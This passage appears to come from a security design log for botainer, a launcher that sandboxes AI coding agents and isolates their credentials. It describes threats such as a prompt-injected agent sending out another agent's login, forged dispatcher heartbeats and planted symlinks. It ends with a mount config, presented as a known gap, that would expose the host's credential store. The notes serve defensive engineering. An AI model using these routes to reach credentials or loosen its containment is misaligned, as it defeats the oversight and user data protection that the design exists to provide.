intersects it with the installed set and from there runs hooks and applies
binds/env/sidecars. `hpc-launcher` declares none of those: `botainer hpc submit`
works off the INSTALLED plugin, and the in-container `botainer-job` is wired by
`job_profiles`, not by enabling. Its only `contributes:` entry is a
`mount_target_prefixes` ENVELOPE — permission to bind under a prefix, not a
contribution.

But two surfaces said otherwise: `botainer plugin list` rendered "installed, not
enabled" (reads as a switch left off), and `botainer init` generated an HPC
template telling users to enable it. The template was half wrong — `hpc-modules`
sits beside it and DOES have a `host_pre_launch` hook, so that one genuinely
must be enabled. Two plugins, one template line, opposite requirements.

`PluginManifest.enabling_is_inert()` derives the answer from what a plugin
DECLARES — hooks, sidecars, entrypoint_wrap, mcp_servers, agent_hints_section,
capability_summary_block, user_tips — not from its name or its `kind:` string.
A plugin that later grows a hook stops being inert automatically; no list to
maintain. Exactly one bundled plugin is inert today.

Three surfaces corrected: `plugin list` says "installed (no enabling needed)";
the generated HPC template drops `hpc-launcher` and keeps `hpc-modules`; both
`hpc submit`/`hpc attach` refusals now say INSTALLED explicitly and add that
enabling is not required.

**On the tests.** No bundled plugin declares an `entrypoint_wrap`, `mcp_servers`
or `user_tips` in ISOLATION — each also has hooks — so deleting those clauses
changed no outcome and they looked like dead code. They are not: a future plugin
declaring only one of them would be reported as "no enabling needed" and the
user would silently lose that behaviour. That is the fail-DANGEROUS direction,
so each clause gets a synthetic-manifest case instead of being trimmed. All
seven clauses are individually mutation-verified.

Surface impact: none — no grant, bind or execution changes. Recorded because it
corrects what the user is TOLD about which plugins are active, which this file
is the contract for.

## 4bw. `--agent` selects the agent at launch, in memory only

`botainer start --agent codex` composes the session with a different agent
plugin than `.botainer/config.yaml` names. Reported as a plain blocker — *"I did
everything, logged in. I start the project, I get claude, not codex! and start
--agent codex not recognized"* — but it touches plugin selection, so it is a
capability-surface change and is recorded here rather than treated as UI.

**What it may do.** Swap the agent plugin for another INSTALLED agent plugin,
preserving the auth-mode suffix: `agent-claude-shared → agent-codex-shared`,
`agent-claude-broker → agent-codex-broker`. The mode the user chose is a
security decision (broker never gives the container a refresh token; shared
does), so switching agents must not silently change it.

**What it may not do.**
- **No disk mutation.** The override lives in the composed session only. A
  `--agent` run cannot rewrite `.botainer/config.yaml`, so it cannot silently
  become the project's persistent agent — and a git-shared config cannot be
  edited by a flag on someone else's machine.
- **No tier or envelope escape.** The substituted plugin goes through the same
  trust-lock, tier-ceiling and mount-envelope checks as a configured one. It is
  a different *choice* among already-permitted plugins, not a new permission.
- **No unknown agents.** An unresolvable name is refused with
  `RefusalCategory.PLUGIN_DEPENDENCY_UNRESOLVED` rather than composing a session
  with no agent.

**Why both agents in one project is the point.** The user's case is a second
opinion on the same tree: *"I thought we wanted to be able to do this cof cases
wher I run second opinion?"* Both agents therefore see the same `/workspace`
bind. They do NOT share credentials — each agent plugin binds its own store —
so a codex session cannot read the Claude credential or vice versa.

**Auth-slot selection is by `auth_family` + `auth_mode`, NOT by `kind`**
(found on a real cluster). Broker and proxy plugins are
`kind: host_helper` — they run a host-side process — while only the
isolated/shared ones are `kind: agent`. Selecting swap candidates on
`kind == "agent"` made two of the four auth modes invisible: after
`auth use broker`, `start --agent codex` saw no current agent, defaulted the
mode to isolated, and appended bare `agent-codex` beside the already-enabled
`agent-codex-broker`, which compose then refused as mutually exclusive. `kind`
describes HOW a plugin is implemented; the question here is WHICH AUTH SLOT it
fills, and one is not a proxy for the other. The mode a user chose is a trust
decision (broker never gives the container a refresh token; shared does), so
silently landing them on a different one is a security-relevant failure, not a
cosmetic one.

Pinned by `tests/unit/test_agent_override.py`.

## 4bx. Isolated codex — OAuth or API key, both resolved under CODEX_HOME (#62)

Isolated (per-project) codex auth accepted **only an API key**, under a hook
docstring asserting "OpenAI doesn't have an OAuth flow like Anthropic" — false;
agent-codex-shared had been using codex's OAuth all day. The effect was a **cost
cliff attached to the more secure option**: choosing per-project isolation forced
per-token API-account billing, while shared and broker modes could use the
ChatGPT/Codex subscription. Isolation and billing are unrelated choices and
should not have been welded together.

**Bind change.** The per-project credential dir now binds at
`/home/agent/.codex` **rw**, replacing `/home/agent/.openai` **ro**.

| | before | after |
|---|---|---|
| target | `/home/agent/.openai` | `/home/agent/.codex` |
| mode | `ro` | `rw` |
| accepts | `api_key` only | `api_key` **or** `auth.json` |

- **Why the move:** codex reads OAuth tokens from `CODEX_HOME`. A credential
  delivered to `.openai` can never be found by the OAuth path — the same
  mounted-and-unfindable failure as §4-`CODEX_HOME` above, one plugin over.
- **Why rw:** codex writes session state into `CODEX_HOME` and refreshes OAuth
  tokens in place; read-only breaks both. The dir is per-project and holds only
  this project's own credential, so rw grants the agent nothing it cannot
  already read.
- **API keys keep working.** The key stays a RAW one-line file (the entrypoint
  `cat`s it; JSON would export the blob as the key), and the hook now overrides
  `OPENAI_API_KEY_FILE` to `/home/agent/.codex/api_key`. Without that override
  the entrypoint would still read the image default under a path nothing binds.
- **`/home/agent/.openai` stays in `mount_target_prefixes`** for per-project dirs
  written before the move. Dropping it would refuse those sessions at compose
  rather than migrate them.

**Login.** OAuth runs exactly as agent-codex-shared runs it — `codex login`
inside the agent-codex container, device-code flow by default, fail-closed if no
fresh credential appears — with the bind pointing at this project's dir instead
of the host-wide one. The container-launch argv is byte-identical between the
two plugins and a drift test asserts it, because duplicated launch logic that
silently diverges is how one auth mode ends up hardened and the other not.

The method is **asked, never inferred** (`BOTAINER_CODEX_LOGIN_METHOD` for
automation; refuses with no TTY): the two paths bill different accounts, and
silently picking the one that spends money is the failure this rule exists to
prevent.

## 4bz. Hook executability is a deploy property, checked on both sides

`botainer start --agent codex` on a cluster refused with *"hook script not
executable: agent-codex-broker/hooks/start_broker.py"*. Three hook scripts were
committed 0644 (agent-codex-broker's `start_broker.py` and `stop_broker.py`,
agent-codex-shared's `login.py`) while agent-claude-broker's were 0755 — so
**codex broker mode had never worked on any platform** since it was written.

The launcher execs hook scripts directly, so this is a hard refusal at session
start, and it survives commit, review and the full suite because nothing else
ever runs them.

**Two guards, on opposite sides of the deploy boundary, and both are needed:**

| | asks | authority |
|---|---|---|
| `tests/integration/test_plugin_hook_integrity.py` | will this REPO deploy correctly? | **git's** recorded mode (100755) |
| `doctor` → `plugins.hooks` | is the install on THIS machine runnable? | the **filesystem** (`os.access`) |

A correct repo still produces a broken install if a copy strips permissions
(`rsync` without `-a`, a zip round-trip, a filesystem with different mode
semantics) — only a check on the target sees that. Conversely a filesystem check
in the dev container is *worthless*: the bind mount reports mode 644 and still
answers `True` to `os.access(X_OK)`, so it would pass here and fail on the
cluster. That is the same platform-divergent blindness that let the bug ship, so
the repo-side guard asserts the thing that actually travels — git's mode.

Both checks cover: the declared script **exists**, is **executable**, has a
**python shebang** (it is exec'd, so no shebang means the kernel picks or
refuses an interpreter), and is **not a stub**. Checked against each manifest's
declared `hooks:` list rather than a glob, because what matters is what the
launcher will try to run.

## 4ca. SECURITY: exactly one agent plugin is activated per session

`botainer auth use <mode>` switches **every** installed family, so a project
ends up with `plugins_enabled: [agent-claude-shared, agent-codex-shared]`.
Composition honoured both. A session running **Claude** therefore carried:

| bind | mode |
|---|---|
| `…/data/agent-codex/profiles/default` → `/home/agent/.codex` | **rw** |
| `…/shared-auth/agent-codex` → `/shared-auth/agent-codex` | **rw** |

plus `CODEX_HOME=/home/agent/.codex` in the env — an advertisement of where the
OpenAI credential lives. **A prompt-injected Claude could read and exfiltrate a
credential belonging to an agent that was not running.** Found by the user
reading their own launch output: *"In a mode when we're not doing multi agent
codex cred leaks into claude???"*

Every plugin was individually correct. Nothing asserted that only ONE agent
should be active, so per-plugin correctness composed into a cross-agent leak.

The same cause broke launch outright: two entrypoint wraps stacked as
`agent-claude-entrypoint agent-codex-entrypoint --sandbox … --ask-for-approval
never`. Claude's wrap ends in `exec claude "$@"`, so codex's entrypoint path
became Claude's first positional — displayed to the user as a **prompt** — and
codex's flags became Claude's: `error: unknown option '--sandbox'`.

**The model, stated explicitly.** `plugins_enabled` is a per-project **menu** of
what this project may use; a **session activates exactly one** agent plugin, the
one matching `agent:` (or `--agent`). Which credentials enter the container is
therefore a **per-session** decision, not a per-project one. Listing several
agent plugins stays legal and is what lets `--agent` switch without editing
config.

**Enforced structurally**, in `_activate_only_the_selected_agent`, which drops
non-selected auth-slot plugins *before* the contribution loop — so binds, env,
hooks and wraps are all consistent with one agent from a single chokepoint.
Guarding only the wrap list would have fixed the visible crash and left the
credential leak in place. Auth-slot membership is decided by `auth_family` +
`auth_mode`, never by `kind` (broker and proxy plugins are `host_helper`).
Non-agent plugins (git, nudge, browser) are never touched.

Pinned by `tests/integration/test_only_one_agent_activated.py`.


## 4cb. A mode or profile switch relocates the agent's config dir — and botainer carries it

Every auth mode binds the same container path from a different host directory,
and the profile name is a path component in all of them:

| mode | host dir behind `/home/agent/.{claude,codex}` |
|---|---|
| shared | `…/data/agent-<x>/profiles/<profile>` |
| isolated | `…/data/agent-<x>/profiles/<profile>` (same as shared) |
| **broker** | `…/data/agent-<x>/broker-state/<profile>` |

**The separation is load-bearing and must not be removed.** `broker-state/`
exists because it holds NO credential — that is broker mode's guarantee, that
the container never receives the refresh token. Shared mode, by contrast, keeps
its login in that directory as a shortcut into `/shared-auth/agent-<x>`.
Binding one directory for all modes would place a real credential inside a
broker session: the §4ca leak, reintroduced from the opposite direction. **Do
not "simplify" these into one path.**

That directory holds more than your login. It is also the agent's whole working
memory — every transcript, todo and setting. So a switch used to swap it for an
empty one, silently. It no longer does.

**All THREE routes carry it**, which is newer than it sounds. There are three
ways to change a mode or profile, and until 2026-09-05 only two of them said
anything:

| route | behaviour |
|---|---|
| `botainer auth use <mode>` | warns, offers the carry |
| `botainer config set profile <x>` | warns, offers the carry |
| **edit `.botainer/config.yaml`, then `botainer start`** | **carried nothing, said nothing** |

The third is the one botainer's own `--auth-profile` help text recommends for a
persistent change, so the documented path was the silent one. `start` now
compares what the config file DECLARED at the last start against what it says
now (`botainer/state/declared.py`) and offers the same carry. It compares the
declared value rather than the effective session spec deliberately: the spec has
one-shot flags folded in, so comparing specs would treat a temporary
`--auth-profile work` as a switch and the next plain `start` as a switch back —
two carries from one flag. Reading only what the file said cannot see a flag.

Without a terminal it states what moved and proceeds rather than prompting:
`start` runs under `hpc submit` and in CI, where a prompt on closed stdin would
turn a config edit into a failed launch.

### What travels

| | carried | why |
|---|---|---|
| transcripts, todos, prompt history | **yes** | the thing the user notices losing |
| `settings.json`, user subagents, plugins | **yes** | nothing about them depends on how you sign in |
| this project's MCP servers, allowed tools, trust answer | **yes** | project config; the state dir is already per-project |
| **your sign-in file** | **no** | see below |
| **the account keys inside `claude.json`** | **no** | see below |

Note what that second row does NOT say. Your transcripts identify you perfectly
well and they travel; this is about two named things, not about anonymity.

**Config travels with history, deliberately.** The state directory is per
PROJECT, so a switch moves between two slots of the same project. Carrying the
transcripts but not the tools would be an arbitrary line.

### What does not, and why

**Your login.** A switch is a change of login, so you sign in once on the other
side and the prompt says so before you agree to it. Two reasons it cannot simply
be copied across. Broker mode's directory is defined by holding no login at all
— that is the guarantee broker mode exists to make, that the container never
receives your refresh token — so putting one there would break it. And shared
mode's login is refreshed in place: copy it and you get two, of which only the
most recently refreshed still works, while nothing tells you which that is
(EF-1).

**Your account details.** Your email address, your organisation's policy flags,
what your plan entitles you to. §4cm settles why these cannot travel: a profile
separates ACCOUNTS, not just files, and nothing on disk can tell you whether two
profiles belong to the same account — not even two with the same name. Since
your login does not travel either, account details that did would leave a
directory naming an account it cannot sign in as. One file mixes these with
settings worth keeping; that file is rebuilt from the settings rather than
copied whole. See property 1.

### Five properties of the carry

Each is a SHAPE rather than a check: the bad outcome is not something botainer
looks for and rejects, it is something the code has no way to express. That
distinction matters because a check only holds while it stays complete, and the
two defects found while building this were both a check that had a gap.

1. **Your sign-in, and the account details stored with it, stay behind.**

   Two specific things from two specific places, not a general guarantee:

   - the file holding your login, in whichever form this mode keeps it;
   - the account keys inside `claude.json` — your email address, your
     organisation's policy flag, and the caches of what your plan allows.

   **This is not anonymity, and the section does not claim it.** Your
   transcripts say who you are, what you work on and how you write, and they
   DO travel — that is the entire point of carrying them. A profile is not a
   disguise and switching to one does not make your history untraceable to
   you.

   What it prevents is narrower and specific. You made two profiles to keep
   two ACCOUNTS apart. If the stored account details travelled, the profile
   you switched *to* would name the account you switched *from* — and since
   your sign-in does not travel either, it would name an account it cannot
   sign in as. That is the failure this stops.

   Three things hold that, rather than one list somebody has to keep complete:

   - **Login files are recognised by name, and the names cannot drift apart.**
     They are listed in two places in the codebase, and a test fails the build
     if the two ever disagree — so a newly-recognised login file cannot quietly
     become something the carry copies.
   - **The one file that mixes account details with settings worth keeping is
     rebuilt, not edited.** botainer copies out the handful of keys it wants —
     this project's MCP servers, your permissions, your trust answer — and
     writes a new file from those. Anything it does not recognise is simply not
     in the result. So a future Claude Code release cannot introduce a field
     that travels by accident. The cost is that a new preference may reset; the
     alternative was that a new account field might leak.
   - **A file botainer cannot read is not carried at all.** If it cannot parse
     the file, it cannot find the account details to leave behind — so it leaves
     the whole file behind.

*Properties 2 and 3 are both about symbolic links, guarding opposite
directions: what botainer READS, and where it WRITES.*

2. **A switch cannot quietly merge two profiles into one account.**

   In shared mode your login is not a file in the profile directory; it is a
   shortcut pointing at one host-wide login that several projects use. Copy that
   shortcut into a profile meant to be separate, and the two now share a login
   while every screen still calls them separate. That is the failure this
   section exists to prevent, arriving by the back door.

   So botainer copies no shortcut, at any depth — it copies only real files.
   Nothing in genuine history is a shortcut, so nothing is lost by the rule.

3. **A copied file cannot land outside the profile you switched to.**

   The directory being written to is the one the agent works in, and the agent
   can leave a shortcut there — say, `projects` pointing at somewhere else on
   your machine. Follow it and the carry writes the agent's own content to a
   path the agent chose. That was possible, was demonstrated, and is fixed.

   It is now impossible rather than checked-for: botainer opens each directory
   in the path one step at a time, refusing to follow a shortcut at any step. A
   check would have a gap between looking and writing; there is nothing to race
   here because there is no check. If it does hit one, it stops and tells you
   in a sentence rather than failing with a kernel error code.

4. **No file is deleted, and no file is overwritten.** True even though the
   carry is a MOVE: files land at the destination and are verified, and only
   then are the source's copies RENAMED into a timestamped sibling. Nothing is
   unlinked. Only files that verifiably arrived are moved, so a copy that
   failed leaves its original where it was.

   Two precise limits on that sentence, because it is the kind of promise
   people rely on. Directories left EMPTY by the move are removed — they hold
   nothing at that point, but "no file" is the accurate word, not "nothing".
   And the guarantee is about botainer's own writes: it does not stop you, or
   the agent, deleting something afterwards.

   Destination files are created so that an existing file is never replaced,
   which holds even against a session that starts mid-carry. Two populated
   directories are never merged — that cannot be undone — so the carry stops
   and shows each side's size, last-written time and the opening prompt of its
   newest transcript.

5. **A switch is refused outright while a session is running.** The directory
   being relocated is the one a live agent has bound and open. This is a
   refusal, not a warning: there is no version of "rename this running agent's
   transcripts anyway" worth offering.

**Why a move and not a copy.** With a copy, switching away, working, and
switching back leaves two populated directories and no sound way to say which is
current — only a modification time. A login can answer that question about itself
— the token carries its own expiry date — but a transcript cannot. So the two
differ by kind: copy-and-sync suits a login, a move suits history.

### A cross-agent switch is not a carry

Claude's directory and codex's share no format; copying either way would be junk
in a directory the tool then has to survive reading. `config set agent` says
plainly that this starts a fresh history and that the old one stays where it is.
Unrepresentable rather than checked: the switch helper derives both paths from
one agent.

### Where the superseded copies go

`<profile>.superseded-<timestamp>/`, beside the profile it came from. `botainer
where` lists these as reclaimable: they are the one thing inside `data/` that is
safe to delete, because every byte in them was written to the live location and
verified before the rename.

### Pinned by

`tests/unit/test_history_carry.py`, `tests/unit/test_history_prompt.py` and
`tests/unit/test_history_dir_matches_hooks.py` — the last RUNS each agent
plugin's `pre_session` hook and asserts the directory it binds is the directory
the carry targets. A carry between two directories no session reads would report
success and do nothing.


## 4ch. Project-name charset: an allowlist, but a less lossy one

**The allowlist stays.** Only `[A-Za-z0-9._-]` can reach a path botainer
builds. That is a property, not a filter: it holds regardless of input, so
there is no charset gap to keep patching. Widening it to "real Unicode" would
buy prettier names and cost normalization (macOS stores filenames NFD, Linux
NFC — the same name typed on two machines becomes two different byte strings),
case-folding, and shell-quoting on every path we print. Not worth it for a
convenience alias.

**What changed is how much the allowlist discards on the way in.** Three steps
now run first, so the guarantee is unchanged and the result is readable:

| input | was | now |
|---|---|---|
| `Café-Analyse` | `Caf_-Analyse` | `Cafe-Analyse` |
| `Müller_data` | `M_ller_data` | `Muller_data` |
| `my project` | `my_project` | `my-project` |
| `my.project (v2)` | `my.project__v2` | `my.project-v2` |
| `数据分析` / `проект` / `ניתוח` | `_` | `project` |
| `""` | `_` | `project` |

1. NFKD normalize, drop combining marks — accents fold to base letters.
2. Whitespace becomes `-`. The alias is `<name>-<short-uuid>` and callers split
   on the LAST `-`, so an inner one is unambiguous.
3. A run of separators collapses to its first character, so a user's own `_`
   survives while `-(` does not become `-_`.

**Documented limit.** A name in a script with no Latin equivalent survives none
of this and falls back to `project`, so those users get `project-<short-uuid>`
and the uuid does all the identifying. Transliterating properly needs a
dependency we do not want. The right fix is to let people SET the alias instead
of deriving it — a `name:` field or an `init --name` flag — which belongs with
the v0.1.1 projects tool (#124). Until then the degradation is pinned by
`test_nothing_usable_falls_back_to_a_word_not_punctuation` so it stays
intentional rather than being discovered by a user whose whole project list
reads `_-1a2b3c4d`.

`tests/unit/test_project_name_sanitizing.py::test_output_is_always_in_the_allowlist`
drives path traversal, NUL, RTL-override, shell metacharacters, a leading `--`
and a 500-char name through it and asserts the output is in-charset,
non-empty, `/`-free, `..`-free and never flag-shaped.


## 4ct. codex/claude shared mode — the parity the two must keep (#136)

Both plugins implement the same protocol by hand: symlink the project's
credential into a shared store, detect the break-away an in-container refresh
causes, back-fill, re-link. Every hardening applied to one has at some point not
been applied to the other, and each gap surfaced years later by accident.

| | claude | codex, before | consequence |
|---|---|---|---|
| exit reconcile | present | **no `post_session` at all** | a refresh waited until THAT project's next start; a different project starting in between inherited the stale token and reported a login failure — the exact bug the claude fix exists for |
| ordering | strictly-later expiry required | back-filled on content inequality alone | an **older** token could overwrite a newer one |
| locking | fail-closed since #266 | `except OSError: tmp.rename(...)` | did the unlocked write **precisely when** the safety mechanism was unavailable; two sessions then both spend the rotating refresh token, which trips the provider's reuse lockout |

All three closed. `reconcile_shared_credential` was extracted from codex's
`main()` so its new `post_session` calls **the same function** rather than a
second implementation — the drift being fixed is exactly what two
implementations produce.

**The ordering signal is weaker for codex and this is stated, not hidden.**
claude has `expiresAt`; codex's `auth.json` format is undocumented and no real
file was available while writing this, so `_last_refresh` reads `last_refresh`
defensively and `_is_newer` returns TRUE when NEITHER side carries the field.
That is deliberate: refusing without a signal would turn "might overwrite a
newer token" into "never propagates a refresh", which is the failure the whole
mechanism exists to prevent. Marked UNVERIFIED in the source.

**And the inverse, which is why "copy claude's file" is not the fix:** codex has
a same-account `tokens.account_id` gate that claude has no equivalent for
(§4cm). **Neither plugin is a superset of the other.**

`tests/integration/test_shared_plugins_have_parity.py` drives both through the
same scenarios. Each test was verified to FAIL when its fix is reverted —
which caught a bad test of my own: the ordering check originally grepped for
`_is_newer`, and renaming the function to `_DISABLED_is_newer` still contained
the substring, so it passed with the guard removed. Replaced with a behavioural
test that writes an older credential and asserts the shared store is unchanged.
Presence is not effect.

**This is a backstop, not the fix.** The structural answer is one trusted
reconcile both plugins call with the per-agent parts (filename, block shape,
identity extractor) as parameters. Until that lands, these tests make the next
divergence fail here rather than on someone's cluster.


## 4cs. `--auth-profile` reaches the session through the hook env allowlist (#149)

`--auth-profile` must cross the hook env allowlist, or it reaches nothing.
`cli/start.py` set
`os.environ["BOTAINER_PROFILE"]`, and `run_hook` scrubs the host environment to
`_HOOK_ENV_ALLOWLIST`, which does not contain it. Measured before the fix: with
the variable set exactly as start.py did, the hook created `profiles/default`.

So `--auth-profile work` did nothing at session time, while
`auth login --profile work` DID honour it (`cli/auth.py` sets it explicitly in
the login hook's env) and created a directory no session would ever read.
botainer told the user a separation existed and then did not honour it.

**The allowlist was deliberately NOT widened.** That list governs what of the
HOST's environment survives into a hook — it is a scrub boundary, and every
value added to it is a permanent new channel from the host into plugin
subprocesses. A profile is not host state; it is a composition decision. So:

- `spec.profile` (already present and already charset-validated) is the single
  source;
- composition writes `"BOTAINER_PROFILE": spec.profile` into **all three**
  hook-env dicts — `host_pre_launch`, `pre_session`, `post_session`. All three,
  because a hook that saw the wrong account depending on WHEN it ran would be a
  worse bug than the one being fixed;
- `--auth-profile` is a `compose_session` parameter overriding `cfg.profile`
  **in memory only**, the same discipline as `--auth-mode` (§4bw): eager config
  mutation plus an atexit restore cannot survive SIGKILL/OOM/exec, and a
  project left silently switched to another account's profile is worse than one
  left in the wrong mode.

The old `os.environ` write is gone, which also closes its second defect: it
propagated into every process the launcher exec'd — screen sessions, child
shells — violating the one-shot contract.

Pinned by `test_profile_reaches_session_hooks_via_the_spec_not_the_host_env`,
which asserts BOTH halves: the allowlist stays closed, and the profile arrives
anyway. Plus an end-to-end test that drives `compose_session` +
`run_pre_session_hooks` and checks a `profiles/work/` directory actually
appears — the real path, not a hook invoked with an env var, which is the
mistake that hid this for months.

**Not yet fixed, and now the live half:** the shared-mode credential store has
no profile component (§4cm), so with the plumbing working, two profiles in
shared mode would resolve to one credential file. That scenario is
`xfail(strict=True)` in `test_profile_and_mode_sequences.py` and is what the
`auth/host/<agent>/<profile>/` layout is for.


## 4cu. Dispatcher: a per-project claim, and a reason the agent can act on

Three things that cross the cage boundary around dispatched jobs.

**1. New refusal category `job-submit-rejected`, carrying EXTERNAL text.**
`submit_request`'s `except Exception` deliberately shows the caged agent only a
`Refused`'s own message, never an arbitrary exception — so a job Slurm turned
down arrived as `internal error handling request (CalledProcessError)`. That is
correct about not leaking internals and useless about the most common first-run
failure, since the shipped job-profile template writes `account: ""`.

`sbatch_submit()` now converts a non-zero sbatch into
`Refused(JOB_SUBMIT_REJECTED, ...)`, which IS forwarded. The message therefore
contains text botainer did not author, and is sanitized before it crosses:

  * absolute paths → `<path>` (the agent must not learn host layout, its own
    uuid, or another user's directory names from an error string);
  * non-printable characters dropped (ANSI/NUL — the same discipline
    `_scrub_profile_text` applies to profile `notes`, which reach the agent
    through a channel framed as trusted operator guidance);
  * first two lines only, 240 chars.

This is a FILTER, not a structural guarantee: it holds only while the
substitutions above cover what sbatch can emit. It backs up the structural gap
that we cannot control a third-party scheduler's stderr. Tested in
`tests/unit/test_sbatch_rejection_is_actionable.py`.

**2. The dispatcher's claim and log live in `run/`, which is never bound.**
`<mailbox>/run/dispatcher.json` (the O_EXCL claim + heartbeat) and
`run/dispatcher.log`. `run/` is the host-private third of the directional
mailbox (§1, INV-1: `in/` agent-write, `out/` agent-RO, `run/` unbound), so the
agent cannot read the claim, forge a heartbeat to make a rogue dispatcher look
alive, or pre-plant a symlink where either file is written. Putting either in
`in/` or `out/` would hand the agent a lever on host process control.

The claim is NOT a security boundary and is not documented as one: it prevents
ACCIDENTAL double-dispatch (two sessions, or a user following a stale "restart
it" hint), and the cost of losing a race is a duplicate sbatch, not an escape.

**3. AGENT_HINTS no longer asserts the dispatcher always runs.** It stated as a
HARD RULE that the dispatcher "runs AUTOMATICALLY" and that the agent must not
ask the user to start one. True for an interactive session; false for `hpc
submit`, where nothing starts one. The agent also cannot check — by (2), the
claim is unbound on purpose — so a job stuck at `pending` is its only signal,
and the hints now say that and name the login-node command.

## 4cy. A state root outside $HOME is refused, with the reason and the fix

`_resolve_state_root` raised a bare `ValueError` when `MY_BOTAINER` pointed
outside `$HOME` / `/workspace` / temp. That is the FIRST thing anyone tries when
a home directory fills, and it is the exact state a storage migration passes
through if the launcher wrapper is not updated in the same breath as the code
sync — so the failure mode was nine frames of click internals, from every
command including `botainer doctor`, the one you would run to find out why.
Same class as the disk-quota traceback (§4cv): a condition with a specific
remedy, delivered as a crash.

Now `Refused(STATE_ROOT_NOT_ALLOWED)` naming the actual remedy, which is NOT
"choose a different root" — it is per-component relocation (§4cw), so the bulk
data moves and the credentials do not. A message that only said "refused" would
send the user to try another volume, which is the same mistake again.

**The allowlist itself is unchanged.** This is presentation, not policy: the
same paths are refused, for the same reason (`shared-auth/` and
`state/<uuid>/data/` must not land on group-visible storage).

Found while doing so: `botainer doctor` was the ONLY command in the CLI without
`@handle_refusals`, so ANY refusal raised while collecting findings became a
traceback — in the command whose whole job is explaining a broken install.
Fixed, and pinned by a test.

## 4cx. Shared auth — a second concurrent session triggers an advisory warning

`botainer start` and `botainer hpc submit` both check, before launching a
shared-auth session, whether another project already has a LIVE one, and stop
to ask. Same check, one implementation
(`cli/_common.confirm_no_other_shared_session`); an AST test asserts both call
sites exist, because the first cut had it on `start` only — the laptop path
guarded and the cluster path, which is the product, not.

**Why a check accompanies documentation.** The launcher can identify other
recorded holders before launch. Refresh-token invalidation is an observed Claude
concern; short Codex shared-session overlap can work, and its renewal concurrency
is not established. This detector does not determine provider token semantics.
Interactive launches ask whether to continue; non-interactive or `--yes` launches
print the warning and continue. The warning's existing wording overstates the
Codex conclusion and still needs correction.

**Trust.** The check reads `spec.plugins_enabled` from session records under
`state/<uuid>/sessions/` to decide whether to interrupt a launch — agent-
supplied data would make that a control channel. It is not: `sessions/` is
NEVER bound into a container. Only `packages`, `scratch`, `home`,
`AGENT_HINTS.md`, `botainer-job` and per-plugin data dirs are. Verified, not
assumed.

**This is ADVISORY, not a boundary, and must not be documented as one.** Any
failure reading the bookkeeping returns silently and the launch proceeds: a
missed warning costs a re-login, a launch refused over an unparseable record
costs the user their session. It reduces an invisible failure to a visible
one; it does not serialize refreshes. Broker mode performs refreshes on the host
under a shared lock. That mechanism does not establish live renewal behavior for
every provider, client version or platform.

**Cry-wolf guard.** `liveness.is_session_alive` answers "cannot verify" with
TRUE — correct for `status`, wrong for a launch gate. Docker is host-local, so
a docker record from another machine, or on a host with no docker, is skipped
rather than assumed alive; otherwise one stale record on a docker-less cluster
login node would warn on every single start forever. Apptainer+Slurm is
cluster-wide (squeue sees every node) and still counts across hosts.

## 4cw. `/packages` and `/home/user` may live outside the state root

`scratch_root` (§4cq) is joined by `packages_root` and `home_root`, set the same
way — a `template:` in the cluster profile, resolved once at the `for_project`
chokepoint. Three near-identical resolvers were NOT written; there is one,
parameterised by component.

**Why, given scratch already existed.** Scratch fixed the BYTE axis. This is the
INODE axis, which is a different failure: a cluster $HOME with a hard
500,000-file cap was exhausted by `state/<uuid>/packages/` — conda/pip trees,
~8.6 GB but hundreds of thousands of tiny files — and every session died writing
`.meta.json.tmp` with `[Errno 122] Disk quota exceeded`. `/scratch` was already
relocated and did not help at all, because it is the byte-heavy component.

**The rejected alternative is the security-relevant part.** The other way to
solve it was to let `MY_BOTAINER` itself point outside `$HOME` — prototyped as a
`BOTAINER_ALLOW_STATE_ROOT` allowlist extension. That was refused for source.
`_resolve_state_root`'s allowlist exists partly so credentials cannot land on
arbitrary or group-shared volumes; moving the whole root relocates
`shared-auth/` (the host-wide OAuth credential) and every `state/<uuid>/data/`
onto group project space, trading a PROPERTY ("credentials are in the user's
private home") for a FILTER ("the permissions on that shared directory must
stay correct forever"). Per-component roots buy the inodes without spending the
guarantee. Pinned by
`tests/integration/test_packages_home_roots.py::test_moving_a_component_does_not_move_credentials`.

**Containment.** Each bind source is checked against ITS OWN declared root, in
both guards — `composition.py`'s `_containment` table and
`hpc/jobs.py::child_core_binds`. Hardcoding the state root for a relocatable
component is not a stricter check, it is a BREAKAGE: it refuses a legitimate
bind, which is how the dispatcher came to fail every cycle with
`[mount-source-denied]` when scratch first moved (d734529). Both guards are
listed in one place each for that reason.

**What that containment check actually is.** For a component under the state
root it is a real filter: `base/packages` is inside a directory the agent writes
to across sessions, so a planted symlink is caught. For a RELOCATED component it
is VACUOUS by construction — `packages_dir` returns `packages_root`, so the
check compares a path to itself and can never fail. The protection there is a
TRUST BOUNDARY, not a filter: the root comes from a cluster profile the launcher
reads before the container exists, and the caged agent has no path to set it.

This is documented rather than quietly relied upon because the equivalent
scratch test asserted the wrong property and SKIPPED on every run since it was
written, blaming "platform cannot express this" — it looked like it pinned a
security guarantee and pinned nothing. Both properties now have tests that fail
when the guard is removed.

## 4cz. The state root is never handed to a container

**What is at stake.** `$MY_BOTAINER` — `~/.botainer/` unless you moved it — is
botainer's own directory on the host. It holds your agent login
(`shared-auth/`), every project's identity and credentials
(`state/<uuid>/data/`), the installed plugin tree, and the host-wide policy
file. A container able to read that directory would hold your login token and
*every* project's state at once, not only the project it was launched for.

**What botainer does.** No mount botainer composes uses the state root as its
source. The container receives specific directories from *inside* it, one per
purpose — `/packages`, `/scratch`, `/home/user`, the selected agent's credential
directory, and the session's own hint files — each named individually and
mounted at a fixed target. Nothing mounts the root itself, or any directory
above it.

This holds under both container runtimes botainer supports, Docker and
Apptainer. The Apptainer path additionally runs with `--containall` and a
redirected HOME, so your real home directory is not visible either.

It is a property of how the mount plan is built rather than a check applied
afterwards: every entry comes from a per-component path, so there is no step in
composition that could name the root.
`tests/integration/test_state_root_not_bound.py` fails if any bind source ever
becomes the root or a directory above it.

**Where this stops — and it does stop.** The above describes the plan botainer
builds for you. It does not cover a mount *you* add.

Two things are checked when you declare a mount, and only one of them helps
here. The **target** must be on the policy allowlist — `/data`, `/datasets`,
`/shared`, `/scratch`, `/mnt` by default — so a mount aimed anywhere else is
refused. The **source** is checked against a denylist that covers your home
directory and sensitive paths inside it, such as `~/.ssh`. `~/.botainer` is not
on that denylist, and the target allowlist contains ordinary directory names
that a real project might genuinely want.

So a mount of this shape is accepted — an absolute path to the state root, aimed
at an allowlisted target:

```text
mounts:
  extra:
    - source: /Users/you/.botainer     # absolute; `~` is not expanded
      target: /data                    # on the allowlist, so not refused
      mode: rw
```

(Shown as text rather than a copyable config on purpose: it is the thing not to
write.)

